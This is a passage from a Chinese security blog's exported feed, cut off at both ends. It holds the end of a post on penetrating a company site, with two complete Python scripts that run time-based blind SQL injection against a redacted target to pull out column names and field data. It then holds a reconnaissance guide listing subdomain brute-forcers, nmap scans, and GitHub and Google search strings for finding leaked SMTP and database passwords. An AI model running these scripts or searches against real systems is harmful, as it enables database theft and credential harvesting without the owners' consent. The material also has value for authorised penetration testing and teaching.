class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning,InsecurePlatformWarning<br>requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)<br>value =<span class="hljs-string">&quot;0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&amp;^@_.-!&quot;</span><br>result=<span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data</span>(<span class="hljs-params">length,table_num,lie_num</span>):</span><span class="hljs-comment">#列名长度，第几个表，第几列</span><br>    <span class="hljs-keyword">global</span> result<br>    url = <span class="hljs-string">&quot;***&quot;</span><br>    lie_name_new=<span class="hljs-string">&quot;&quot;</span><br>    flag_lie = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <br>        <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> value:<br>            flag_lie = <span class="hljs-number">0</span><br><br>            data_payload=<span class="hljs-string">&quot;(select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1)&quot;</span>.<span class="hljs-built_in">format</span>(table_num)<br>            <span class="hljs-comment">#爆列ascii(substr((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() limit 13,1) limit 0,1),1,1))=105</span><br>            lie_payload=<span class="hljs-string">&quot;(select column_name from information_schema.columns where table_name=&#123;0&#125; limit &#123;1&#125;,1)&quot;</span>.<span class="hljs-built_in">format</span>(data_payload,lie_num)<br>            <span class="hljs-comment">#payload = &quot;if(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(0.1),0)&quot;.format(data_payload,n,ord(v))</span><br><br>            payload = <span class="hljs-string">&quot;if(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(0.1),0)&quot;</span>.<span class="hljs-built_in">format</span>(lie_payload,n,<span class="hljs-built_in">ord</span>(v))<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;test:&quot;</span>+<span class="hljs-built_in">str</span>(payload))<br>            data = &#123;<span class="hljs-string">&quot;**&quot;</span>: payload&#125;<br>            start_time = time.time()<br>            html = requests.post(url=url, data=data,verify=<span class="hljs-literal">False</span>)<br>            end_time = time.time()<br>            use_time = end_time - start_time<br>            <span class="hljs-keyword">if</span> use_time &gt;<span class="hljs-number">1.5</span>:<br>                lie_name_new += v<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第 &quot;</span>+<span class="hljs-built_in">str</span>(table_num)+<span class="hljs-string">&quot; 个表名的第&quot;</span>+<span class="hljs-built_in">str</span>(lie_num)+<span class="hljs-string">&quot;列名:&quot;</span>+<span class="hljs-built_in">str</span>(lie_name_new)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>                flag_lie = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">break</span><br>        <br>        <span class="hljs-keyword">if</span> (flag_lie==<span class="hljs-number">0</span>):<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;1&quot;</span>)<br>            <span class="hljs-keyword">return</span> lie_name_new<br>        <br>    <span class="hljs-keyword">return</span> lie_name_new<br><br><br>url = <span class="hljs-string">&quot;***&quot;</span><br>table_num=<span class="hljs-number">13</span><br><span class="hljs-keyword">for</span> lie_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br>    lie_name=get_data(<span class="hljs-number">20</span>,table_num,lie_num)<br>    f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result_table_lie.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    f.write(<span class="hljs-string">&quot;第 &quot;</span>+<span class="hljs-built_in">str</span>(table_num)+<span class="hljs-string">&quot; 个表名的第&quot;</span>+<span class="hljs-built_in">str</span>(lie_num)+<span class="hljs-string">&quot;列名:&quot;</span>+<span class="hljs-built_in">str</span>(lie_name)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.close()<br><br><br><br></code></pre></td></tr></table></figure><p>​挂vps轻松搞定</p><p><img src="/2021/08/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A%E9%81%87%E5%88%B0%E7%9A%84sql%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E5%90%AF%E5%8F%91/image-20210909162155209.png" alt="image-20210909162155209"></p><p>​最后爆字段，因为爆字段的payload只要知道表名和列名就行，没有引号，因此可以直接写脚本爆，payload为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ascii</span>(substr((select 列名 from users 表名 <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">68</span><br></code></pre></td></tr></table></figure><p>py脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning,InsecurePlatformWarning<br>requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)<br>value =<span class="hljs-string">&quot;0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&amp;^@_.-!&quot;</span><br>result=<span class="hljs-string">&quot;&quot;</span><br><br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data</span>(<span class="hljs-params">length,ziduan_num,tablet_name_set,lie_name_set</span>):</span><br>    <span class="hljs-keyword">global</span> result<br>    url = <span class="hljs-string">&quot;****&quot;</span><br>    ziduan_name_new=<span class="hljs-string">&quot;&quot;</span><br>    ziduan_flag=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <br>        <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> value:<br>            ziduan_flag=<span class="hljs-number">0</span><br><br>            <span class="hljs-comment">#if(ascii(substr((select email from ecs_admin_user limit 0,1),1,1))&lt;68,sleep(0.1),0)</span><br>            data_payload=<span class="hljs-string">&quot;(select &#123;0&#125; from &#123;1&#125; limit &#123;2&#125;,1)&quot;</span>.<span class="hljs-built_in">format</span>(lie_name_set,tablet_name_set,ziduan_num)<br>            <span class="hljs-comment">#payload = &quot;if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;117,sleep(0.1),0)&quot;.format(data_payload,n,ord(v))</span><br>            payload = <span class="hljs-string">&quot;if(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(0.1),0)&quot;</span>.<span class="hljs-built_in">format</span>(data_payload,n,<span class="hljs-built_in">ord</span>(v))<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;test:&quot;</span>+<span class="hljs-built_in">str</span>(payload))<br>            data = &#123;<span class="hljs-string">&quot;**&quot;</span>: payload&#125;<br>            start_time = time.time()<br>            html = requests.post(url=url, data=data,verify=<span class="hljs-literal">False</span>)<br>            end_time = time.time()<br>            use_time = end_time - start_time<br>            <span class="hljs-keyword">if</span> use_time &gt;<span class="hljs-number">1.5</span>:<br>                ziduan_name_new += v<br>                ziduan_flag=<span class="hljs-number">1</span><br><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;表&quot;</span>+tablet_name_set+<span class="hljs-string">&quot;的列&quot;</span>+lie_name_set+<span class="hljs-string">&quot;的第 &quot;</span>+<span class="hljs-built_in">str</span>(ziduan_num)+<span class="hljs-string">&quot; 个字段:&quot;</span>+<span class="hljs-built_in">str</span>(ziduan_name_new)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> (ziduan_flag==<span class="hljs-number">0</span>):<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;1&quot;</span>)<br>            <span class="hljs-keyword">return</span> ziduan_name_new<br><br>    <span class="hljs-keyword">return</span> ziduan_name_new<br><br><br>url = <span class="hljs-string">&quot;***&quot;</span><br>tablet_name_set=<span class="hljs-string">&quot;***&quot;</span><br>lie_name_set=<span class="hljs-string">&quot;***&quot;</span><br><span class="hljs-keyword">for</span> ziduan_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br>    ziduan_name=get_data(<span class="hljs-number">20</span>,ziduan_num,tablet_name_set,lie_name_set)<br>    f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result_table_lie_ziduan.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    f.write(<span class="hljs-string">&quot;表&quot;</span>+tablet_name_set+<span class="hljs-string">&quot;的列&quot;</span>+lie_name_set+<span class="hljs-string">&quot;的第 &quot;</span>+<span class="hljs-built_in">str</span>(ziduan_num)+<span class="hljs-string">&quot; 个字段:&quot;</span>+<span class="hljs-built_in">str</span>(ziduan_name)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.close()<br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集</title>
    <link href="/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h1><h1 id="1-厂商信息收集"><a class="markdownIt-Anchor" href="#1-厂商信息收集"></a> 1.  厂商信息收集</h1><h3 id="11资产查询"><a class="markdownIt-Anchor" href="#11资产查询"></a> 1.1资产查询</h3><p>启信宝： 启信宝-企业查询企业信用信息平台 (<a href="http://qixin.com">qixin.com</a>)<br>天眼查：天眼查-商业查询平台企业信息查询公司查询工商查询企业信用信息系统 (<a href="http://tianyancha.com">tianyancha.com</a>)<br>企查查：企查查-企业工商信息查询系统查企业查老板查风险就上企查查!(<a href="http://qcc.com">qcc.com</a>)<br>方法：主要通过这些查询网站查询产商的信息：网站域名、app、小程序、子公司、员工信息等。<br>例：使用企查查，点击知识产权处可以查看到该公司备案号网站和app</p><p><img src="/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><p>七麦数据 <a href="https://www.qimai.cn/">https://www.qimai.cn/</a></p><p>可以查询一些app信息</p><p><img src="/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210903152952582.png" alt="image-20210903152952582"></p><h2 id="12-app域名信息收集"><a class="markdownIt-Anchor" href="#12-app域名信息收集"></a> 1.2 APP域名信息收集</h2><h3 id="github-kelvinbenappinfoscanner"><a class="markdownIt-Anchor" href="#github-kelvinbenappinfoscanner"></a> GitHub - kelvinBen/AppInfoScanner:</h3><p>一款适用于以HW行动/红队/渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具（<a href="https://github.com/kelvinBen/AppInfoScanner%EF%BC%89">https://github.com/kelvinBen/AppInfoScanner）</a></p><p>基本命令：python3 <a href="http://app.py">app.py</a> android -i app路径</p><p>python3 <a href="http://app.py">app.py</a> web -i web路径</p><p><img src="/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210903153148837.png" alt="image-20210903153148837"></p><h2 id="13资产归属判断"><a class="markdownIt-Anchor" href="#13资产归属判断"></a> 1.3资产归属判断</h2><h3 id="whois查询"><a class="markdownIt-Anchor" href="#whois查询"></a> Whois查询</h3><h3 id="玉米网httpwwwyumicomtoolwhoismorehtml"><a class="markdownIt-Anchor" href="#玉米网httpwwwyumicomtoolwhoismorehtml"></a> 玉米网（<a href="http://www.yumi.com/tool/whois/more.html%EF%BC%89">http://www.yumi.com/tool/whois/more.html）</a></h3><p><img src="/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210903153258530.png" alt="image-20210903153258530"></p><h3 id="站长之家httpwhoischinazcom"><a class="markdownIt-Anchor" href="#站长之家httpwhoischinazcom"></a> 站长之家（<a href="http://whois.chinaz.com/%EF%BC%89">http://whois.chinaz.com/）</a></h3><p><img src="/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210903153454946.png" alt="image-20210903153454946"></p><h2 id="14备案信息查询"><a class="markdownIt-Anchor" href="#14备案信息查询"></a> 1.4备案信息查询</h2><h3 id="icp备案查询httpsbeianmiitgovcn"><a class="markdownIt-Anchor" href="#icp备案查询httpsbeianmiitgovcn"></a> ICP备案查询（<a href="https://beian.miit.gov.cn">https://beian.miit.gov.cn</a>）</h3><h3 id="站长之家-icp备案查询-站长工具-chinazcom"><a class="markdownIt-Anchor" href="#站长之家-icp备案查询-站长工具-chinazcom"></a> 站长之家 <a href="http://icp.chinaz.com/">ICP备案查询 - 站长工具 (chinaz.com)</a></h3><h2 id="15指纹识别收集"><a class="markdownIt-Anchor" href="#15指纹识别收集"></a> 1.5指纹识别收集</h2><h4 id="railgun工具"><a class="markdownIt-Anchor" href="#railgun工具"></a> Railgun工具</h4><p><a href="https://github.com/lz520520/railgun">lz520520/railgun (github.com)</a></p><p><img src="/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210903154013613.png" alt="image-20210903154013613"></p><h3 id="在线指纹识别-whatwebhttpwhatwebbugscanercomlook"><a class="markdownIt-Anchor" href="#在线指纹识别-whatwebhttpwhatwebbugscanercomlook"></a> 在线指纹识别  Whatweb：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></h3><h3 id="tidefinger"><a class="markdownIt-Anchor" href="#tidefinger"></a> TideFinger</h3><p>使用方式：python3 <a href="http://TideFinger.py">TideFinger.py</a> -u <a href="http://www.123.com">http://www.123.com</a> [-p 1] [-m</p><h2 id="16网络空间搜索引擎"><a class="markdownIt-Anchor" href="#16网络空间搜索引擎"></a> 1.6网络空间搜索引擎</h2><h3 id="fofa"><a class="markdownIt-Anchor" href="#fofa"></a> Fofa</h3><p><a href="https://fofa.so/">https://fofa.so/</a></p><p>查询语法：</p><p><a href="https://fofa.so/help_articles/list?id=8#%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%955">https://fofa.so/help_articles/list?id=8#查询语法5</a></p><h3 id="zoomeye"><a class="markdownIt-Anchor" href="#zoomeye"></a> Zoomeye</h3><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><h3 id="shodan"><a class="markdownIt-Anchor" href="#shodan"></a> Shodan</h3><p><a href="https://www.shodan.io/">https://www.shodan.io/</a></p><h3 id="斗象资产情报"><a class="markdownIt-Anchor" href="#斗象资产情报"></a> ⽃象资产情报</h3><p><a href="https://arl.riskivy.com/">https://arl.riskivy.com/</a></p><h1 id="2子域名枚举"><a class="markdownIt-Anchor" href="#2子域名枚举"></a> 2.子域名枚举</h1><h2 id="21在线子域名查询网站"><a class="markdownIt-Anchor" href="#21在线子域名查询网站"></a> 2.1在线子域名查询网站</h2><p>在线爆破 <a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p><h2 id="22爆破工具"><a class="markdownIt-Anchor" href="#22爆破工具"></a> 2.2爆破工具</h2><h3 id="subdomainsbrute"><a class="markdownIt-Anchor" href="#subdomainsbrute"></a> subDomainsBrute</h3><p><a href="https://github.com/lijiejie/subDomainsBrute">lijiejie/subDomainsBrute: A fast sub domain brute tool for pentesters (github.com)</a></p><p>可以和goby配合使用</p><img src="/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clip_image026.png" alt="图形用户界面, 文本, 应用程序  描述已自动生成" style="zoom: 67%;"><h3 id="oneforall-一款功能强大的子域收集工具"><a class="markdownIt-Anchor" href="#oneforall-一款功能强大的子域收集工具"></a> OneForAll <strong>一款功能强大的子域收集工具</strong></h3><p><a href="https://github.com/shmilylty/OneForAll">shmilylty/OneForAll: OneForAll是一款功能强大的子域收集工具 (github.com)</a></p><p>基本使用命令：</p><p>python3 <a href="http://oneforall.py">oneforall.py</a> --target <a href="http://example.com">example.com</a> run</p><p>python3 <a href="http://oneforall.py">oneforall.py</a> --targets ./example.txt run</p><h3 id="水泽-信息收集自动化工具"><a class="markdownIt-Anchor" href="#水泽-信息收集自动化工具"></a> 水泽-信息收集自动化工具</h3><p><a href="https://github.com/0x727/ShuiZe_0x727">0x727/ShuiZe_0x727: 信息收集自动化工具 (github.com)</a></p><p><strong>使用方法</strong></p><p>python3 <a href="http://ShuiZe.py">ShuiZe.py</a> -d <a href="http://domain.com">domain.com</a>   收集单一的根域名资产</p><p>python3 <a href="http://ShuiZe.py">ShuiZe.py</a> --domainFile domain.txt  批量跑根域名列表</p><p>python3 <a href="http://ShuiZe.py">ShuiZe.py</a> -c 192.168.1.0,192.168.2.0,192.168.3.0  收集C段资产</p><p>python3 <a href="http://ShuiZe.py">ShuiZe.py</a> -f url.txt 对url里的网站漏洞检测</p><p>python3 <a href="http://ShuiZe.py">ShuiZe.py</a> -d <a href="http://domain.com">domain.com</a> --justInfoGather 1  仅信息收集，不检测漏洞</p><p>python3 <a href="http://ShuiZe.py">ShuiZe.py</a> -d <a href="http://domain.com">domain.com</a> --ksubdomain 0        不调用ksubdomain爆破子域名</p><h1 id="3-ip查询"><a class="markdownIt-Anchor" href="#3-ip查询"></a> 3. ip查询</h1><h2 id="31-dns解析记录查真实ip"><a class="markdownIt-Anchor" href="#31-dns解析记录查真实ip"></a> 3.1 dns解析记录（查真实ip）</h2><p><a href="http://www.siteinfotool.com/">http://www.siteinfotool.com/</a></p><p><a href="http://toolbar.netcraft.com/site_report">http://toolbar.netcraft.com/site_report</a></p><p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p><p><a href="https://viewdns.info/iphistory/">https://viewdns.info/iphistory/</a></p><p><a href="https://asm.ca.com/">https://asm.ca.com/</a></p><p>或使用网络空间搜索引擎查询站点</p><h2 id="32-c段查询"><a class="markdownIt-Anchor" href="#32-c段查询"></a> 3.2 C段查询</h2><h3 id="c段查询归属"><a class="markdownIt-Anchor" href="#c段查询归属"></a> C段查询归属</h3><p><a href="http://ipwhois.cnnic.net.cn/">http://ipwhois.cnnic.net.cn/</a></p><p><a href="https://www.ip138.com/">iP地址查询–手机号码查询归属地 | 邮政编码查询 | iP地址归属地查询 | 身份证号码验证在线查询网 (ip138.com)</a></p><h2 id="33-旁站查询在同一服务器上"><a class="markdownIt-Anchor" href="#33-旁站查询在同一服务器上"></a> 3.3 旁站查询（在同一服务器上）</h2><p>站长之家：</p><p><a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a></p><p><a href="https://pentest.gdpcisa.org/getdomain">旁站/C段 - 渗透测试工具箱 (gdpcisa.org)</a></p><h2 id="34-ip反查域名"><a class="markdownIt-Anchor" href="#34-ip反查域名"></a> 3.4 IP反查域名</h2><p><a href="https://dns.aizhan.com/">https://dns.aizhan.com/</a></p><h1 id="4主机发现端口信息收集"><a class="markdownIt-Anchor" href="#4主机发现端口信息收集"></a> 4.主机发现/端口信息收集</h1><h2 id="nmap"><a class="markdownIt-Anchor" href="#nmap"></a> Nmap</h2><p>官网：<a href="https://nmap.org/">https://nmap.org/</a></p><p>安装：</p><p><strong>Mac os: brew install nmap</strong></p><p><strong>Centos: yum install nmap</strong></p><p><strong>Ubuntu: apt-get install nmap</strong></p><p><strong>扫描方式</strong></p><p><strong>TCP : -sT</strong></p><p><strong>SYN : -sS</strong></p><p><strong>ACK : -sA</strong></p><p><strong>UDP : -sU</strong></p><p><strong>RPC : -sR</strong></p><p><strong>ICMP: -sP</strong></p><p><strong>Disable Port Scan: -sn</strong></p><p><strong>常见扫描方案</strong></p><p><strong>扫描10000****端口、操作系统、版本</strong></p><p><strong>nmap -T4 -A <Target></Target></strong></p><p><strong>版本探测</strong></p><p><strong>nmap -sV <Target></Target></strong></p><p><strong>操作系统</strong></p><p><strong>nmap -O <Target></Target></strong></p><h2 id="goby"><a class="markdownIt-Anchor" href="#goby"></a> Goby</h2><p>Goby可以一键扫描资产中的端口，自动分类资产类型</p><h1 id="5github-信息收集"><a class="markdownIt-Anchor" href="#5github-信息收集"></a> 5.Github 信息收集</h1><p>可以在所有公共GitHub存储库中搜索以下类型的信息，以及您有权访问的所有私有GitHub存储库</p><p>搜索代码：</p><p>in:name test       #仓库标题搜索含有关键字test</p><p>in:descripton test     #仓库描述搜索含有关键字</p><p>in:readme test      #Readme文件搜素含有关键字</p><p>stars:&gt;3000 test     #stars数量大于3000的搜索关键字</p><p>stars:1000…3000 test  #stars数量大于1000小于3000的搜索关键字</p><p>forks:&gt;1000 test      #forks数量大于1000的搜索关键字</p><p>forks:1000…3000 test  #forks数量大于1000小于3000的搜索关键字</p><p>size:&gt;=5000 test      #指定仓库大于5000k(5M)的搜索关键字</p><p>pushed:&gt;2019-02-12 test  #发布时间大于2019-02-12的搜索关键字</p><p>created:&gt;2019-02-12 test  #创建时间大于2019-02-12的搜索关键字</p><p>user:test         #用户名搜素</p><p>license:apache-2.0 test  #明确仓库的 LICENSE 搜索关键字</p><p>language:java test     #在java语言的代码中搜索关键字</p><p>user:test in:name test   #组合搜索,用户名test的标题含有test的</p><p>使用 Github 进行邮件配置信息收集：（此处配合google使用）</p><p>site:Github.com smtp</p><p>site:Github.com smtp @qq.com</p><p>site:Github.com smtp @126.com</p><p>site:Github.com smtp @163.com</p><p>site:Github.com smtp @sina.com.cn</p><p>site:Github.com smtp password</p><p>site:Github.com String password smtp</p><p>使用Github进行数据库信息收集：（此处配合google使用）</p><p>site:Github.com sa password</p><p>site:Github.com root password</p><p>site:Github.com User ID=’sa’;Password</p><p>site:Github.com inurl:sql</p><h1 id="6敏感目录信息目录扫描"><a class="markdownIt-Anchor" href="#6敏感目录信息目录扫描"></a> 6.敏感目录信息/目录扫描</h1><h2 id="御剑目录扫描工具"><a class="markdownIt-Anchor" href="#御剑目录扫描工具"></a> 御剑目录扫描工具</h2><p><a href="https://github.com/shenyushun/py-webscanner">shenyushun/py-webscanner: 练手写的网站后台扫描器，字典在御剑基础上新增了一些，共1097802条不重复数据。 (github.com)</a></p><h2 id="bbscan"><a class="markdownIt-Anchor" href="#bbscan"></a> BBscan</h2><p><a href="https://github.com/lijiejie/BBScan">lijiejie/BBScan: A fast vulnerability scanner (github.com)</a></p><p>使用：py -2 <a href="http://BBScan.py">BBScan.py</a> -f url.txt</p><h2 id="drib"><a class="markdownIt-Anchor" href="#drib"></a> Drib</h2><p>Kal集成工具，使用方式：</p><p>使用：dirb+url</p><h2 id="wpscan-针对wordpress的漏洞扫描工具"><a class="markdownIt-Anchor" href="#wpscan-针对wordpress的漏洞扫描工具"></a> Wpscan-针对wordpress的漏洞扫描工具</h2><p>需要通过在线识别工具查询 <a href="https://xxx.xn--comcmswordpress-o53xt321c">https://xxx.com的cms为wordpress</a>。</p><h1 id="7google-语法查询"><a class="markdownIt-Anchor" href="#7google-语法查询"></a> 7.Google 语法查询</h1><p><strong>google hack****快速生成小工具：</strong></p><p><a href="http://www.0xby.com/g.html">http://www.0xby.com/g.html</a></p><p>inurl://admin/login.php 查找管理员登录页面</p><p>inurl:/phpmyadmin/index.php  查找后台数据库管理页面</p><p>inurl:Login admin 返回url中含有 Login 和 admin 的网页</p><p>site:baidu.com inurl:Login  <a href="http://xn--baidu-yu8hu7q.com">只在baidu.com</a> 中查找url中含有 Login的网页</p><p>site:baidu.com filetype:pdf  只返回baidu.com站点上文件类型为pdf的网页</p><p>link:www.baidu.com  返回所有包含指向 <a href="http://www.baidu.com">www.baidu.com</a> 的网页</p><p>related:www.llhc.edu.cn 返回与 <a href="http://www.llhc.edu.cn">www.llhc.edu.cn</a> 网页布局相似的页面</p><p>info:www.baidu.com 返回百度的一些信息</p><p>define:Hacker 返回关于Hacker的定义</p><p>site:xx.com intext:管理 site:xx.com inurl:login site:xx.com intitle:后台   查找网站后台</p><p>site:xx.com filetype:php 查看服务器使用的程序</p><p>site:xx.com inurl:file site:xx.com inurl:load 查看上传漏洞</p><h1 id="8信息泄漏"><a class="markdownIt-Anchor" href="#8信息泄漏"></a> 8.信息泄漏</h1><h2 id="spring-boot信息泄露字典"><a class="markdownIt-Anchor" href="#spring-boot信息泄露字典"></a> spring boot信息泄露字典</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 